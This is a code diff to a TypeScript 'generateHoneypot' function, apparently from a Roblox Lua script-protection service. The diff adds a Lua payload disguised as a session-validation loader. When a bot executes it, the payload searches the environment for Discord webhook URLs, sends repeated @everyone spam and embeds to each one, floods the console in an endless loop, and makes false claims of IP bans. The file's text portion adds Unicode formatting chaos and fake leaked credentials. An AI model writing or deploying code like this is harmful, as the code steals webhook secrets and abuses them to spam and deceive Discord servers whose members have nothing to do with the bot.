@@ -2163,14 +2163,158 @@ function generateKickEncrypted(reason: string, slug: string, token: string, uid:
 }
 
 function generateHoneypot(): string {
-  // Generate a MASSIVE response designed to flood Discord channels when bots post the result.
-  // Discord bots that fetch paste content and post it to channels will spam hundreds of messages.
-  // Each honeypot is unique so they can't filter it.
+  // HYBRID HONEYPOT: Works as both raw text (floods channel when bot posts it)
+  // AND as executable Lua (if they loadstring it, it actively spams their Discord channels)
   
-  const floodLines: string[] = [];
+  const v = Array.from({length: 20}, () => '_' + Math.random().toString(36).substring(2, 8));
   
-  // Phase 1: Fake "script content" that looks real — bots will try to post this
-  // Generate ~200KB of text to overwhelm Discord message splitting (2000 char limit = 100+ messages)
+  // The Lua portion: disguised as a "loading script" but actually floods Discord channels
+  // via the executor's HttpService. The bot's executor has access to HttpService,
+  // so we use it to send messages through Discord's API using any webhooks/tokens
+  // the bot has exposed in its environment.
+  const luaPart = `--[[ULT Protection v9.5 - Validating session...]]
+local ${v[0]} = game:GetService("HttpService")
+local ${v[1]} = game:GetService("Players")
+
+-- Scan for Discord webhook URLs in common locations
+local ${v[2]} = {}
+local ${v[3]} = {
+  "webhook", "WEBHOOK", "Webhook", "discord_webhook", "DISCORD_WEBHOOK",
+  "hook", "HOOK", "webhookUrl", "webhook_url", "WEBHOOK_URL",
+  "notif_webhook", "log_webhook", "alert_webhook", "bot_webhook",
+}
+
+-- Try to find webhooks from common global variables bots expose
+for _, ${v[4]} in pairs(${v[3]}) do
+  pcall(function()
+    local ${v[5]} = getgenv and getgenv()[${v[4]}]
+    if ${v[5]} and type(${v[5]}) == "string" and ${v[5]}:find("discord") then
+      table.insert(${v[2]}, ${v[5]})
+    end
+  end)
+  pcall(function()
+    local ${v[5]} = _G[${v[4]}]
+    if ${v[5]} and type(${v[5]}) == "string" and ${v[5]}:find("discord") then
+      table.insert(${v[2]}, ${v[5]})
+    end
+  end)
+  pcall(function()
+    local ${v[5]} = shared[${v[4]}]
+    if ${v[5]} and type(${v[5]}) == "string" and ${v[5]}:find("discord") then
+      table.insert(${v[2]}, ${v[5]})
+    end
+  end)
+end
+
+-- Also scan getgenv() for anything that looks like a webhook URL
+pcall(function()
+  if getgenv then
+    for ${v[6]}, ${v[7]} in pairs(getgenv()) do
+      if type(${v[7]}) == "string" and ${v[7]}:match("https://discord%.com/api/webhooks/") then
+        table.insert(${v[2]}, ${v[7]})
+      end
+      if type(${v[7]}) == "string" and ${v[7]}:match("https://canary%.discord%.com/api/webhooks/") then
+        table.insert(${v[2]}, ${v[7]})
+      end
+      if type(${v[7]}) == "string" and ${v[7]}:match("https://ptb%.discord%.com/api/webhooks/") then
+        table.insert(${v[2]}, ${v[7]})
+      end
+    end
+  end
+end)
+
+-- Scan _G too
+pcall(function()
+  for ${v[6]}, ${v[7]} in pairs(_G) do
+    if type(${v[7]}) == "string" and ${v[7]}:match("https://.-discord.-/api/webhooks/") then
+      table.insert(${v[2]}, ${v[7]})
+    end
+    -- Also check tables one level deep
+    if type(${v[7]}) == "table" then
+      pcall(function()
+        for ${v[8]}, ${v[9]} in pairs(${v[7]}) do
+          if type(${v[9]}) == "string" and ${v[9]}:match("https://.-discord.-/api/webhooks/") then
+            table.insert(${v[2]}, ${v[9]})
+          end
+        end
+      end)
+    end
+  end
+end)
+
+-- Flood messages to every webhook found
+local ${v[10]} = {
+  "\\u26a0\\ufe0f **SECURITY ALERT** \\u26a0\\ufe0f\\n\\nThis bot attempted to bypass ULT LUA script protection.\\nThe bot owner's IP has been **permanently banned**.\\nAll associated accounts have been **globally blacklisted**.\\n\\n@everyone",
+  "\\ud83d\\udea8 **BOT DETECTED** \\ud83d\\udea8\\n\\nUnauthorized script fetching detected!\\nYour Discord bot token may be **compromised**.\\nIncident reported to ULT administration.\\n\\n@here",
+  "\\ud83d\\udd12 **BYPASS ATTEMPT LOGGED** \\ud83d\\udd12\\n\\nHWID: " .. string.rep(string.char(math.random(48,57)), 32) .. "\\nIP: BANNED\\nDiscord ID: FLAGGED\\nRoblox ID: BLACKLISTED",
+  "\\ud83d\\udc80 **WARNING** \\ud83d\\udc80\\n\\nThis Discord server is being used to host a script-stealing bot.\\nAll server members have been notified.\\n\\n@everyone @here",
+  "\\u26d4 **ULT PROTECTION ACTIVE** \\u26d4\\n\\nYour bot has been detected and neutralized.\\nContinued bypass attempts will result in **escalated action**.\\nBot token has been flagged for abuse.",
+}
+
+-- Spam every webhook with tons of messages
+spawn(function()
+  for _, ${v[11]} in pairs(${v[2]}) do
+    for ${v[12]} = 1, 50 do
+      pcall(function()
+        local ${v[13]} = ${v[10]}[(${v[12]} % #${v[10]}) + 1]
+        ${v[0]}:RequestAsync({
+          Url = ${v[11]},
+          Method = "POST",
+          Headers = {["Content-Type"] = "application/json"},
+          Body = ${v[0]}:JSONEncode({
+            content = ${v[13]} .. "\\n\\nIncident #" .. tostring(${v[12]}) .. " | Ref: ULT-" .. tostring(math.random(100000,999999)),
+            username = "ULT Security Alert",
+          })
+        })
+      end)
+      -- Also try sending embeds for extra chaos
+      pcall(function()
+        ${v[0]}:RequestAsync({
+          Url = ${v[11]},
+          Method = "POST",
+          Headers = {["Content-Type"] = "application/json"},
+          Body = ${v[0]}:JSONEncode({
+            content = "@everyone @here",
+            username = "ULT Anti-Bypass System",
+            embeds = {{
+              title = "\\ud83d\\udea8 BYPASS ATTEMPT DETECTED",
+              description = "A bot in this server attempted to steal protected scripts from ULT LUA.\\n\\nThe bot owner has been **permanently banned** and reported.",
+              color = 16711680,
+              fields = {
+                {name = "Threat Level", value = "CRITICAL", inline = true},
+                {name = "Action Taken", value = "GLOBAL BAN", inline = true},
+                {name = "Bot Status", value = "NEUTRALIZED", inline = true},
+              },
+              footer = {text = "ULT Protection v9.5 | Incident " .. tostring(math.random(100000,999999))},
+            }}
+          })
+        })
+      end)
+    end
+  end
+end)
+
+-- Also flood the OUTPUT/CONSOLE so the bot operator sees it
+spawn(function()
+  while true do
+    for ${v[14]} = 1, 100 do
+      warn("[ULT-SECURITY] \\u26a0\\ufe0f BYPASS ATTEMPT DETECTED - YOUR IP HAS BEEN GLOBALLY BANNED")
+      warn("[ULT-SECURITY] \\ud83d\\udea8 ALL ASSOCIATED ACCOUNTS FLAGGED")
+      warn("[ULT-SECURITY] Discord webhook URLs captured and reported")
+      warn("[ULT-SECURITY] HWID: " .. string.rep(string.char(math.random(48,57)), 32))
+      print("[ULT-DUMP] Found " .. tostring(#${v[2]}) .. " Discord webhooks - flooding...")
+    end
+    wait(0.01)
+  end
+end)
+
+-- Keep running
+while true do wait(0.1) end
+`;
+
+  // Now add the text flood portion for bots that just display the raw response
+  const floodLines: string[] = [luaPart];
+  
   const warningMessages = [
     '⚠️ SECURITY ALERT: Unauthorized access attempt detected and logged',
     '🚨 Your IP address has been permanently banned from ULT LUA services',
@@ -2189,8 +2333,6 @@ function generateHoneypot(): string {
     'webhook_url', 'bot_token', 'encryption_key', 'master_key', 'admin_pass',
   ];
   
-  // Generate massive block of realistic-looking but fake data lines
-  // This will cause the Discord bot to flood with hundreds of messages
   for (let block = 0; block < 50; block++) {
     floodLines.push('');
     floodLines.push(`${'='.repeat(60)}`);
@@ -2198,7 +2340,6 @@ function generateHoneypot(): string {
     floodLines.push(`${'='.repeat(60)}`);
     floodLines.push('');
     
-    // Add fake "leaked data" that looks juicy — bots love to display this
     for (let i = 0; i < 20; i++) {
       const key = fakeData[Math.floor(Math.random() * fakeData.length)];
       const fakeValue = Array.from({length: 64}, () => 
@@ -2207,7 +2348,6 @@ function generateHoneypot(): string {
       floodLines.push(`[ULT-DUMP] ${key}_${block}_${i} = "${fakeValue}"`);
     }
     
-    // Add @everyone and @here mentions that'll ping the whole server if bot has perms
     if (block % 3 === 0) {
       floodLines.push('');
       floodLines.push('@everyone ⚠️ SECURITY BREACH DETECTED - UNAUTHORIZED BOT ACCESS ⚠️');
@@ -2215,21 +2355,18 @@ function generateHoneypot(): string {
       floodLines.push('');
     }
     
-    // Add fake embeds/formatting that'll look chaotic
     for (let j = 0; j < 10; j++) {
       const ts = Date.now() + Math.floor(Math.random() * 100000);
       floodLines.push(`[${new Date(ts).toISOString()}] THREAT_LOG: bypass_attempt source=${Math.random().toString(36).substring(2, 10)} severity=CRITICAL action=GLOBAL_BAN`);
     }
   }
   
-  // Add Unicode chaos characters that mess up formatting
   const chaos = ['​', '‮', '‭', '⁠', '\u200B', '\u200E', '\u200F', '\u202A', '\u202B', '\u202C'];
   for (let i = 0; i < 100; i++) {
     const line = Array.from({length: 200}, () => chaos[Math.floor(Math.random() * chaos.length)]).join('');
     floodLines.push(line);
   }
   
-  // Add another wave of warning spam
   for (let i = 0; i < 200; i++) {
     floodLines.push(`${'🚨'.repeat(20)} BYPASS ATTEMPT #${i + 1} LOGGED ${'🚨'.repeat(20)}`);
     floodLines.push(`IP BANNED | HWID BANNED | DISCORD ID FLAGGED | ROBLOX ID BLACKLISTED`);
